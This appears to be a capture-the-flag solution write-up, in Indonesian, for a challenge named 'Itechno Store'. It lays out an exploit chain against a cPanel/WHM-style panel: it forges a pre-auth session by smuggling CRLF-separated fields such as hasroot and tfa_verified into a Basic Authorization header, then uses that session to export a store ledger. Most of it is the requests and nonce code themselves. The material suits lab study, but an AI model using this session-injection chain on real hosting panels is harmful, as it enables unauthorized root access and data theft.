# Itechno Store Solution

## Intended Chain

1. Temukan compatibility bridge dari header `X-Panel-Compatibility`, `robots.txt`, atau `/.well-known/cpanel-dcv`.
2. Buat pre-auth session:

   ```http
   POST /login/?login_only=1
   user=root&pass=x
   ```

3. Ambil `whostmgrsession`. Bagian sebelum `%2c` adalah session id.
4. Kirim request ke `/` dengan cookie tersebut dan header:

   ```text
   Authorization: Basic base64("root:x\r\nhasroot=1\r\ntfa_verified=1\r\nuser=root\r\ncp_security_token=/cpsess4194001337\r\nsuccessful_internal_auth_with_timestamp=<now>\r\nstore.acl=ledger:read,settlement:write\r\nstore.market=ID-JKT\r\nstore.mfa=device-bound\r\n")
   ```

5. Baca config store:

   ```http
   GET /cpsess4194001337/json-api/storefront_config?api.version=1
   ```

6. Hitung nonce:

   ```python
   sha256(f"{session_id}:{active_batch}:settlement".encode()).hexdigest()[:20]
   ```

7. Export ledger:

   ```http
   GET /cpsess4194001337/json-api/store_export_ledger?api.version=1&batch=<active_batch>&nonce=<nonce>
   ```
